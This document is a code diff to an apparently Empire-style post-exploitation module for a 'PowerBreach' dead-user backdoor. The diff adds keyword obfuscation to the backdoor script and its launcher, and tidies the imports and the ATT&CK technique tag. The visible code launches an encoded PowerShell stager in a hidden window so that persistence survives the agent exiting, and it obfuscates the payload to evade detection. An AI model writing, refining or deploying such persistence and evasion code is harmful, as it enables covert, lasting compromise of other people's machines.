@@ -1,8 +1,11 @@
 from __future__ import print_function
-from builtins import str
-from builtins import object
+
 import os
+from builtins import object
+from builtins import str
+
 from lib.common import helpers
+
 
 class Module(object):
 
@@ -17,7 +20,7 @@ class Module(object):
 
             'Software': '',
 
-            'Techniques': ['TA0003'],
+            'Techniques': ['T1098'],
 
             'Background' : False,
 
@@ -190,8 +193,10 @@ Invoke-DeadUserBackdoor"""
             print(helpers.color("[+] PowerBreach deaduser backdoor written to " + outFile))
             return ""
 
+        script = helpers.keyword_obfuscation(script)
         if obfuscate:
             script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
+
         # transform the backdoor into something launched by powershell.exe
         # so it survives the agent exiting  
         modifiable_launcher = "powershell.exe -noP -sta -w 1 -enc "
@@ -200,8 +205,10 @@ Invoke-DeadUserBackdoor"""
         parts = stagerCode.split(" ")
 
         # set up the start-process command so no new windows appears
-        scriptLauncher = "Start-Process -NoNewWindow -FilePath '%s' -ArgumentList '%s'; 'PowerBreach Invoke-DeadUserBackdoor started'" % (parts[0], " ".join(parts[1:]))
-        if obfuscate:
-            scriptLauncher = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptLauncher, obfuscationCommand=obfuscationCommand)
+        script = "Start-Process -NoNewWindow -FilePath '%s' -ArgumentList '%s'; 'PowerBreach Invoke-DeadUserBackdoor started'" % (parts[0], " ".join(parts[1:]))
 
-        return scriptLauncher
+        if obfuscate:
+            script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
+        script = helpers.keyword_obfuscation(script)
+
+        return script
